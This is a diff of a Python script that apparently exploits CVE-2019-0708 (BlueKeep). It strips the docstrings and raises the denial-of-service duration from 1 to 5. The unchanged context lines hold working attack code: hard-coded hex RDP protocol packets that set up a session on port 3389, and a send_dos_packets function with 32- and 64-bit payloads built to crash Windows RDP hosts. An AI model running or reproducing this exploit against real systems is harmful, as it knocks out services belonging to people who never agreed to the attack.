@@ -66,16 +66,10 @@ class RDP_NEG_REQ(CR_TPDU):
 
 
 def unpack(packet):
-    """
-    unpack a packet into its hex
-    """
     return binascii.unhexlify(packet)
 
 
 def structify(packet, struct_mode, differences):
-    """
-    structify the packets if needed
-    """
     assert type(differences) == tuple
     differs = [struct.pack(struct_mode, len(packet)), struct.pack(struct_mode, len(packet) - differences[0]),
                struct.pack(struct_mode, len(packet) - differences[1]),
@@ -86,9 +80,6 @@ def structify(packet, struct_mode, differences):
 
 
 def send_initialization_pdu_packet(host, port=3389, verbose=False):
-    """
-    initialize the RDP request
-    """
     tpkt = TPKT()
     tpdu = TPDU()
     rdp_neg = RDP_NEG_REQ()
@@ -114,11 +105,6 @@ def send_initialization_pdu_packet(host, port=3389, verbose=False):
 
 
 def send_client_data_pdu_packet(tls, deletion_structure=(12, 109, 118, 132, 390), verbose=False):
-    """
-    client information packet
-    """
-    # i've done some more research and this can be a fixed length, but idk what the fixed length is
-    # and i dont feel like figuring it out
     packet = unpack(
         "030001ca02f0807f658207c20401010401010101ff30190201220201020201000201010201000201010202ffff0201023019020101020"
         "10102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff02010204820161"
@@ -153,9 +139,6 @@ def send_client_data_pdu_packet(tls, deletion_structure=(12, 109, 118, 132, 390)
 
 
 def send_client_information_pdu_packet(tls):
-    """
-    client info packets
-    """
     packet = unpack(
         "0300016102f08064000703eb7081524000a1a509040904bb47030000000e00080000000000000041004100410041004100410041000000"
         "740065007300740000000000000002001c003100390032002e004141410038002e003200330032002e0031000000400043003a005c0057"
@@ -169,11 +152,6 @@ def send_client_information_pdu_packet(tls):
 
 
 def send_channel_pdu_packets(tls, retval_size=1024, verbose=False):
-    """
-    channel join
-    erect domain
-    and user packets in one swoop
-    """
     packet = unpack("0300000c02f0800401000100")
     tls.sendall(bytes(packet))
     packet = unpack("0300000802f08028")
@@ -209,9 +187,6 @@ def send_channel_pdu_packets(tls, retval_size=1024, verbose=False):
 
 
 def send_confirm_active_pdu_packet(tls):
-    """
-    confirm the user is active
-    """
     packet = unpack(
         "0300026302f08064000703eb70825454021300f003ea030100ea0306003e024d5354534300170000000100180001000300000200000000"
         "1d04000000000000000002001c00200001000100010080073804000001000100001a010000000300580000000000000000000000000000"
@@ -232,9 +207,6 @@ def send_confirm_active_pdu_packet(tls):
 
 
 def send_establish_session_pdu_packet(tls):
-    """
-    establish the connection
-    """
     packet = unpack("0300002402f08064000703eb701616001700f003ea030100000108001f0000000100ea03")
     tls.sendall(bytes(packet))
     packet = unpack("0300002802f08064000703eb701a1a001700f003ea03010000010c00140000000400000000000000")
@@ -275,9 +247,6 @@ def send_establish_session_pdu_packet(tls):
 
 
 def send_dos_packets(tls, arch_selected):
-    """
-    theoretically, the arch shouldn't matter, but for good measures we'll make it matter
-    """
     arch_32_packet = unpack("0300002e02f08064000703ef70140c0000000300000000000000020000000000000000000000")
     arch_64_packet = unpack(
         "0300002e02f08064000703ef70140c000000030000000000000000000000020000000000000000000000000000000000000000000000"
@@ -290,7 +259,7 @@ def send_dos_packets(tls, arch_selected):
 
 
 def cve_2019_0708(target):
-    dos_time = 1
+    dos_time = 5
     run_verbose = False
     wait_time = 0
     arch = 64
